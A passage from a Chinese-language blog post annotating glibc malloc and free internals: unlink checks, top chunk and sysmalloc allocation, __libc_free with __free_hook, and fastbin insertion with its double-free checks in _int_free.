&amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Split */</span></span><br><span class="line">    <span class="keyword">else</span>		<span class="comment">//切割指定大小的堆块,剩下的送给unsortedbin</span></span><br><span class="line">    &#123;</span><br><span class="line">      remainder = chunk_at_offset(victim, nb);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">         have to perform a complete insert here.  */</span></span><br><span class="line">      bck = unsorted_chunks(av);</span><br><span class="line">      fwd = bck-&gt;fd;</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely(fwd-&gt;bk != bck))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      remainder-&gt;bk = bck;</span><br><span class="line">      remainder-&gt;fd = fwd;</span><br><span class="line">      bck-&gt;fd = remainder; </span><br><span class="line">      fwd-&gt;bk = remainder;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* advertise as last remainder */</span></span><br><span class="line">      <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">        av-&gt;last_remainder = remainder;</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(remainder_size))</span><br><span class="line">      &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">      set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line">      set_foot(remainder, remainder_size);</span><br><span class="line">    &#125;</span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h6 id="unlink">unlink</h6>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/unlink.png"
alt="unlink" />
<figcaption aria-hidden="true">unlink</figcaption>
</figure>
<p>从双向链表上摘下一个堆块<code>P</code>,把它的前后驱重新链接起来</p>
<p>针对<code>smallbin</code>和<code>unsortedbin</code>,有如下检查</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;bk-&gt;fd==P</span><br><span class="line">P-&gt;fd-&gt;bk==P</span><br></pre></td></tr></table></figure>
<p>如果是一个<code>largebin</code>的堆块,还会有</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">P-&gt;fd_nextsize-&gt;bk_nextsize==P</span><br><span class="line">P-&gt;bk_nextsize-&gt;fd_nextsize==P</span><br></pre></td></tr></table></figure>
<p>对于<code>smallbin</code>和<code>unsortedbin</code>,如果检查通过,则执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">BK-&gt;fd = FD;     </span><br></pre></td></tr></table></figure>
<p>将P的前后驱连接起来</p>
<p>对于<code>largebin</code>的堆块,还会执行</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">    FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">  <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">  &#123;                                                                                                                 \</span><br><span class="line">    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">    FD-&gt;bk_nextsize </span><br><span class="line">    = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">  &#125;                                                                                                                 \</span><br><span class="line">&#125;                                                                                                                   \</span><br><span class="line"><span class="keyword">else</span>                                                                                                                \</span><br><span class="line">&#123;                                                                                                                   \</span><br><span class="line">  P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">  P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>
<p>完整代码如下:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Take a chunk off a bin list */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> unlink(AV, P, BK, FD)                                                                                               \</span></span><br><span class="line"><span class="meta">  &#123;                                                                                                                         \</span></span><br><span class="line"><span class="meta">    FD = P-&gt;fd;                                                                                                             \</span></span><br><span class="line"><span class="meta">    BK = P-&gt;bk;                                                                                                             \</span></span><br><span class="line"><span class="meta">    <span class="keyword">if</span> (__builtin_expect(FD-&gt;bk != P || BK-&gt;fd != P, 0))                                                                    \</span></span><br><span class="line"><span class="meta">      <span class="comment">//检查后继的前驱指针以及前驱的后继指针</span></span></span><br><span class="line">      malloc_printerr(check_action, <span class="string">&quot;corrupted double-linked list&quot;</span>, P, AV);                                                 \</span><br><span class="line">    <span class="keyword">else</span>                                                                                                                    \</span><br><span class="line">    &#123;                                                                                                                       \</span><br><span class="line">      FD-&gt;bk = BK;                                                                                                          \</span><br><span class="line">      <span class="comment">//将前后驱堆块连接,解放P</span></span><br><span class="line">      BK-&gt;fd = FD;                                                                                                          \</span><br><span class="line">      <span class="keyword">if</span> (!in_smallbin_range(P-&gt;size) &amp;&amp; __builtin_expect(P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>))                                       \</span><br><span class="line">      &#123;                                                                                                                     \</span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect(P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>) || __builtin_expect(P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>)) \</span><br><span class="line">          malloc_printerr(check_action,                                                                                     \</span><br><span class="line">                          <span class="string">&quot;corrupted double-linked list (not small)&quot;</span>,                                                       \</span><br><span class="line">                          P, AV);                                                                                           \</span><br><span class="line">        <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>)                                                                                        \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                                                                                          \</span><br><span class="line">            FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;                                                                         \</span><br><span class="line">          <span class="keyword">else</span>                                                                                                              \</span><br><span class="line">          &#123;                                                                                                                 \</span><br><span class="line">            FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                               \</span><br><span class="line">            FD-&gt;bk_nextsize </span><br><span class="line">            = P-&gt;bk_nextsize;                                                                               \</span><br><span class="line">            P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                                                                               \</span><br><span class="line">            P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                                                                               \</span><br><span class="line">          &#125;                                                                                                                 \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">        <span class="keyword">else</span>                                                                                                                \</span><br><span class="line">        &#123;                                                                                                                   \</span><br><span class="line">          P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;                                                                     \</span><br><span class="line">          P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;                                                                     \</span><br><span class="line">        &#125;                                                                                                                   \</span><br><span class="line">      &#125;                                                                                                                     \</span><br><span class="line">    &#125;                                                                                                                       \</span><br><span class="line">  &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="topchunk申请">topchunk申请</h5>
<p>如果还不行,尝试使用topchunk分配</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">use_top:</span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">     If large enough, split off the chunk bordering the end of memory</span></span><br><span class="line"><span class="comment">     (held in av-&gt;top). Note that this is in accord with the best-fit</span></span><br><span class="line"><span class="comment">     search rule.  In effect, av-&gt;top is treated as larger (and thus</span></span><br><span class="line"><span class="comment">     less well fitting) than any other available chunk since it can</span></span><br><span class="line"><span class="comment">     be extended to be as large as necessary (up to system</span></span><br><span class="line"><span class="comment">     limitations).</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">     We require that av-&gt;top always exists (i.e., has size &gt;=</span></span><br><span class="line"><span class="comment">     MINSIZE) after initialization, so if it would otherwise be</span></span><br><span class="line"><span class="comment">     exhausted by current request, it is replenished. (The main</span></span><br><span class="line"><span class="comment">     reason for ensuring it exists is that we may need MINSIZE space</span></span><br><span class="line"><span class="comment">     to put in fenceposts in sysmalloc.)</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line"></span><br><span class="line">  victim = av-&gt;top;</span><br><span class="line">  size = chunksize(victim);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>)(nb + MINSIZE))</span><br><span class="line">  &#123;</span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset(victim, nb);</span><br><span class="line">    av-&gt;top = remainder;</span><br><span class="line">    set_head(victim, nb | PREV_INUSE |</span><br><span class="line">                         (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head(remainder, remainder_size | PREV_INUSE);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem(victim);</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* When we are using atomic ops to free fast chunks we can get</span></span><br><span class="line"><span class="comment">     here for all block sizes.  */</span></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (have_fastchunks(av))</span><br><span class="line">  &#123;</span><br><span class="line">    malloc_consolidate(av);</span><br><span class="line">    <span class="comment">/* restore original bin index */</span></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb))</span><br><span class="line">      idx = smallbin_index(nb);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      idx = largebin_index(nb);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h5 id="sysmalloc申请">sysmalloc申请</h5>
<p>如果还不行,尝试sysmalloc</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">   Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">  <span class="keyword">if</span> (p != <span class="literal">NULL</span>)</span><br><span class="line">    alloc_perturb(p, bytes);</span><br><span class="line">  <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="free">free</h3>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strong_alias(__libc_free, __free) strong_alias(__libc_free, free)</span><br></pre></td></tr></table></figure>
<h4 id="libc_free">__libc_free</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __libc_free(<span class="type">void</span> *mem)</span><br><span class="line">&#123;</span><br><span class="line">  mstate ar_ptr;</span><br><span class="line">  mchunkptr p; <span class="comment">/* chunk corresponding to mem */</span></span><br><span class="line"></span><br><span class="line">  <span class="type">void</span> (*hook)(<span class="type">void</span> *, <span class="type">const</span> <span class="type">void</span> *) = atomic_forced_read(__free_hook);<span class="comment">//首先尝试调用hook函数(如果有注册的话)</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect(hook != <span class="literal">NULL</span>, <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    (*hook)(mem, RETURN_ADDRESS(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (mem == <span class="number">0</span>) <span class="comment">/* free(0) has no effect */</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">  p = mem2chunk(mem);<span class="comment">//p指向堆块基址,mem指向数据区,也就是p+0x10</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (chunk_is_mmapped(p)) <span class="comment">/* release mmapped memory. */</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span></span><br><span class="line">    <span class="keyword">if</span> (!mp_.no_dyn_threshold &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      mp_.mmap_threshold = chunksize(p);</span><br><span class="line">      mp_.trim_threshold = <span class="number">2</span> * mp_.mmap_threshold;</span><br><span class="line">      LIBC_PROBE(memory_mallopt_free_dyn_thresholds, <span class="number">2</span>,</span><br><span class="line">                 mp_.mmap_threshold, mp_.trim_threshold);</span><br><span class="line">    &#125;</span><br><span class="line">    munmap_chunk(p);<span class="comment">//如果p堆块是mmap分配的则调用munmap释放</span></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  ar_ptr = arena_for_chunk(p);</span><br><span class="line">  _int_free(ar_ptr, p, <span class="number">0</span>);<span class="comment">//调用glibc实现的_int_free,这也是默认释放过程</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="free_hook">__free_hook</h5>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">weak_variable</span> <span class="params">(*__free_hook)</span><span class="params">(<span class="type">void</span> *__ptr,<span class="type">const</span> <span class="type">void</span> *)</span> = <span class="literal">NULL</span>;</span><br></pre></td></tr></table></figure>
<p>与<code>__malloc_hook</code>同理,如果本钩子函数有注册过则调用之进行释放,不会再调用glibc自己实现的<code>_int_free</code></p>
<h4 id="int_free">_int_free</h4>
<p>实际上调用的释放函数</p>
<h4 id="算法流程-1">算法流程</h4>
<figure>
<img
src="https://raw.githubusercontent.com/DeutschBall/picbed/main/free.png"
alt="free" />
<figcaption aria-hidden="true">free</figcaption>
</figure>
<p>整个流程要比分配<code>_int_malloc</code>简单点</p>
<h4 id="局部变量-1">局部变量</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">INTERNAL_SIZE_T size;     <span class="comment">/* its size */</span>		<span class="comment">//用于保存请求堆块的整体大小(包括元数据)</span></span><br><span class="line">mfastbinptr *fb;          <span class="comment">/* associated fastbin */</span>		<span class="comment">//fastbin桶子</span></span><br><span class="line">mchunkptr nextchunk;      <span class="comment">/* next contiguous chunk */</span>		<span class="comment">//下一个堆块</span></span><br><span class="line">INTERNAL_SIZE_T nextsize; <span class="comment">/* its size */</span>					<span class="comment">//下一个堆块的大小</span></span><br><span class="line"><span class="type">int</span> nextinuse;            <span class="comment">/* true if nextchunk is used */</span>	<span class="comment">//下一个堆块是否在使用,合并堆块时用</span></span><br><span class="line">INTERNAL_SIZE_T prevsize; <span class="comment">/* size of previous contiguous chunk */</span>	<span class="comment">//前块大小</span></span><br><span class="line">mchunkptr bck;            <span class="comment">/* misc temp for linking */</span>		<span class="comment">//头插法前后邻居</span></span><br><span class="line">mchunkptr fwd;            <span class="comment">/* misc temp for linking */</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span> *errstr = <span class="literal">NULL</span>;</span><br><span class="line"><span class="type">int</span> locked = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">size = chunksize(p);		<span class="comment">//size当前要申请的堆块的大小(包括元数据)</span></span><br></pre></td></tr></table></figure>
<h4 id="释放前检查">释放前检查</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Little security check which won&#x27;t hurt performance: the</span></span><br><span class="line"><span class="comment">   allocator never wrapps around at the end of the address space.</span></span><br><span class="line"><span class="comment">   Therefore we can exclude some size values which might appear</span></span><br><span class="line"><span class="comment">   here by accident or by &quot;design&quot; from some intruder.  */</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect((<span class="type">uintptr_t</span>)p &gt; (<span class="type">uintptr_t</span>)-size, <span class="number">0</span>) || __builtin_expect(misaligned_chunk(p), <span class="number">0</span>))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid pointer&quot;</span>;</span><br><span class="line">errout:</span><br><span class="line">  <span class="keyword">if</span> (!have_lock &amp;&amp; locked)</span><br><span class="line">    (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">  malloc_printerr(check_action, errstr, chunk2mem(p), av);</span><br><span class="line">  <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">/* We know that each chunk is at least MINSIZE bytes in size or a</span></span><br><span class="line"><span class="comment">   multiple of MALLOC_ALIGNMENT.  */</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(size &lt; MINSIZE || !aligned_OK(size)))</span><br><span class="line">&#123;</span><br><span class="line">  errstr = <span class="string">&quot;free(): invalid size&quot;</span>;</span><br><span class="line">  <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">check_inuse_chunk(av, p)</span><br></pre></td></tr></table></figure>
<p>检查锁和对齐,整个释放过程可以看成一个事务,由锁保证一致性</p>
<h4 id="fastbin区释放">fastbin区释放</h4>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">  <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>)(size) &lt;= (<span class="type">unsigned</span> <span class="type">long</span>)(get_max_fast())<span class="comment">//如果释放堆块大小落在fastbin范围内</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> TRIM_FASTBINS</span></span><br><span class="line">      <span class="comment">/*</span></span><br><span class="line"><span class="comment">  If TRIM_FASTBINS set, don&#x27;t place chunks</span></span><br><span class="line"><span class="comment">  bordering top into fastbins</span></span><br><span class="line"><span class="comment">      */</span></span><br><span class="line">      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<span class="comment">//检查后面是否和topchunk相邻,(如果相邻需要合并,不会进入fastbin)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  )</span><br><span class="line">  &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>) || __builtin_expect(chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">    &#123;<span class="comment">//首先检查堆块大小是否比最小大小要大,并且是不是可以分配的范围内</span></span><br><span class="line">      <span class="comment">/* We might not have a lock at this point and concurrent modifications</span></span><br><span class="line"><span class="comment">         of system_mem might have let to a false positive.  Redo the test</span></span><br><span class="line"><span class="comment">         after getting the lock.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock || (&#123;c</span><br><span class="line">            assert(locked == <span class="number">0</span>);</span><br><span class="line">            mutex_lock(&amp;av-&gt;mutex);</span><br><span class="line">            locked = <span class="number">1</span>;</span><br><span class="line">            chunk_at_offset(p, size)-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ || chunksize(chunk_at_offset(p, size)) &gt;= av-&gt;system_mem;</span><br><span class="line">          &#125;))</span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;free(): invalid next size (fast)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!have_lock)</span><br><span class="line">      &#123;</span><br><span class="line">        (<span class="type">void</span>)mutex_unlock(&amp;av-&gt;mutex);</span><br><span class="line">        locked = <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//已获得锁</span></span><br><span class="line">    free_perturb(chunk2mem(p), size - <span class="number">2</span> * SIZE_SZ);<span class="comment">//堆块的mem数据区清零</span></span><br><span class="line"></span><br><span class="line">    set_fastchunks(av);</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> idx = fastbin_index(size);<span class="comment">//计算fastbin桶子下标</span></span><br><span class="line">    fb = &amp;fastbin(av, idx);<span class="comment">//获取fastbin桶子头</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Atomically link P to its fastbin: P-&gt;FD = *FB; *FB = P;  */</span></span><br><span class="line">    mchunkptr old = *fb, old2;<span class="comment">//old指向fastbin对应桶子的第一个堆块</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> old_idx = ~<span class="number">0u</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Check that the top of the bin is not the record we are going to add</span></span><br><span class="line"><span class="comment">         (i.e., double free).  */</span></span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect(old == p, <span class="number">0</span>))<span class="comment">//检查p是否已经被刚刚释放过一次</span></span><br><span class="line">      &#123;</span><br><span class="line">        errstr = <span class="string">&quot;double free or corruption (fasttop)&quot;</span>;</span><br><span class="line">        <span class="keyword">goto</span> errout;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="comment">/* Check that size of fastbin chunk at the top is the same as</span></span><br><span class="line"><span class="comment">         size of the chunk that we are adding.  We can dereference OLD</span></span><br><span class="line"><span class="comment">         only if we have the lock, otherwise it might have already been</span></span><br><span class="line"><span class="comment">         deallocated.  See use of OLD_IDX below for the actual check.  */</span></span><br><span class="line">      <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span>)</span><br><span class="line">        old_idx = fastbin_index(chunksize(old));</span><br><span class="line">      p-&gt;fd = old2 = old;<span class="comment">//把p挂到fastbin上(头插法),fastbin[idx]-&gt;p-&gt;old-&gt;...</span></span><br><span class="line">    &#125; <span class="keyword">while</span> ((old = catomic_compare_and_exchange_val_rel(fb, p, old2)) != old2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (have_lock &amp;&amp; old != <span class="literal">NULL</span> &amp;&amp; __builtin_expect(old_idx != idx, <span class="number">0</span>))</span><br><span class="line">    &#123;</span><br><span class="line">      errstr = <span class="string">&quot;invalid fastbin entry (free)&quot;</span>;</span><br><span class="line">      <span class="keyword">goto</span> errout;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<h4 id="堆块合并">堆块合并</h4>
